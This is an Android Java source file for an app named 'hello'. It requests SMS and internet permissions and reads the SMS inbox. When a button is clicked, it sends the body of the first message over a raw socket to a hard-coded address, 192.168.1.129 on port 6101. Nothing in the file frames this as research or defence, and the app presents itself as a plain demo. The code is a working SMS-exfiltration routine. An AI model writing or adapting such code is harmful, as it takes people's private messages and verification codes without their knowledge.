package com.example.soulomoon.hello;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.StrictMode;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static android.provider.AlarmClock.EXTRA_MESSAGE;
import static com.example.soulomoon.hello.MainActivity.sendSocket;


public class MainActivity extends AppCompatActivity {
    private static final int MY_PERMISSIONS_REQUEST_INTERNET = 412;
    public static String EXTRA_MESSAGE;
    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 401;
    private static final int MY_PERMISSIONS_REQUEST_RECEIVE_SMS = 94;


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getPermissionSms();

        Log.i("获取权限", "获取监听权限");
        setContentView(R.layout.activity_main);
//        sendSocket();

//        List<String> text = getAllSmsFromProvider();
//        int x = text.size();
//        String y = text.get(0);
//        for (String i : text)
//            Log.d("内容:", i);
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public static List<String> getAllSmsFromProvider(Context context) {
        Log.i("getAllSmsFromProvider", "begin");

        List<String> lstSms = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();

        Cursor c = cr.query(Telephony.Sms.Inbox.CONTENT_URI, // Official CONTENT_URI from docs
                new String[] { Telephony.Sms.Inbox.BODY }, // Select body text
                null,
                null,
                Telephony.Sms.Inbox.DEFAULT_SORT_ORDER); // Default sort order

        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                lstSms.add(c.getString(0));
                c.moveToNext();
            }
        } else {
            lstSms.add("You have no SMS in Inbox");
        }
        c.close();

        return lstSms;
    }

    /** Called when the user clicks the Send button */
    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void sendMessage(View view) {
        Context activity = this;
        List<String> text = getAllSmsFromProvider(activity);

//        int x = text.size();
        String newText = text.get(0);
        Log.d("1", newText);
//        for (String i : text)
//            Log.d("内容:", i);

        Log.d("内容:", "给我权限发送socket");
        sendSocket(newText);
        Log.d("内容:", "socket sended");

//        Intent intent = new Intent(this, DisplayMessageActivity.class);
//        EditText editText = (EditText) findViewById(R.id.edit_message);
//        String message = editText.getText().toString();
//        intent.putExtra(EXTRA_MESSAGE, message);
//        startActivity(intent);
    }
    public static void sendSocket(String newText) {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

        StrictMode.setThreadPolicy(policy);
        try {
            String ip = "192.168.1.129";
            Log.d("", "trying to build connection");
            Socket soc= new Socket(ip,6101);
            Log.d("", "socket builded");

//            String toSend= "We are going to send this line";
            String toSend= newText;
            byte[] buffer= toSend.getBytes("UTF-8");//Encoding in UTF-8 system

            DataOutputStream dos= new DataOutputStream(soc.getOutputStream());//gets the output Stream

            dos.write(buffer,0,buffer.length);//writes complete buffer
            dos.writeBytes("\n");// A fancy new line
            dos.flush();//flush the data
            dos.close();

            soc.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void getPermissionSms2() {
        // No explanation needed, we can request the permission.
        MainActivity thisActivity = this;
        Log.d("", "getting permision begin2");
        ActivityCompat.requestPermissions(thisActivity,
                new String[]{Manifest.permission.READ_SMS},
                MY_PERMISSIONS_REQUEST_READ_SMS);
    }

    public void getPermissionSms3() {
        MainActivity thisActivity = this;
        Log.d("", "getting permision begin2");

        ActivityCompat.requestPermissions(thisActivity,
                new String[]{Manifest.permission.RECEIVE_SMS},
                MY_PERMISSIONS_REQUEST_RECEIVE_SMS);
    }
    public void getPermissionSms() {
        // Here, thisActivity is the current activity
        MainActivity thisActivity = this;
        Log.d("", "getting permision begin");
        ActivityCompat.requestPermissions(thisActivity,
                new String[]{Manifest.permission.INTERNET},
                MY_PERMISSIONS_REQUEST_INTERNET);





//        if (ContextCompat.checkSelfPermission(thisActivity,
//                Manifest.permission.READ_SMS)
//                != PackageManager.PERMISSION_GRANTED) {
//
//            // Should we show an explanation?
//            if (ActivityCompat.shouldShowRequestPermissionRationale(thisActivity,
//                    Manifest.permission.READ_SMS)) {
//
//                // Show an expanation to the user *asynchronously* -- don't block
//                // this thread waiting for the user's response! After the user
//                // sees the explanation, try again to request the permission.
//
//            } else {
//
//                // No explanation needed, we can request the permission.
//                ActivityCompat.requestPermissions(thisActivity,
//                        new String[]{Manifest.permission.READ_SMS},
//                        MY_PERMISSIONS_REQUEST_READ_SMS);
//
//                // MY_PERMISSIONS_REQUEST_READ_SMS is an
//                // app-defined int constant. The callback method gets the
//                // result of the request.
//                ActivityCompat.requestPermissions(thisActivity,
//                        new String[]{Manifest.permission.RECEIVE_SMS},
//                        MY_PERMISSIONS_REQUEST_RECEIVE_SMS);
//            }
//        }
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_READ_SMS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.d("内容:", "给我权限监听手机短信接收");
                    getPermissionSms3();
//                    List<String> text = getAllSmsFromProvider();
//                    for (String i : text)
//                        Log.d("内容:", i);
                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.

                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                }
                return;
            }
            case MY_PERMISSIONS_REQUEST_RECEIVE_SMS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Log.d("内容:", "给我权限监听手机短信接收");
                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.

                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                }
                return;
            }
            case MY_PERMISSIONS_REQUEST_INTERNET: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    getPermissionSms2();



                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.

                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                }
                return;
            }

            // other 'case' lines to check for other
            // permissions this app might request
        }
    }







}
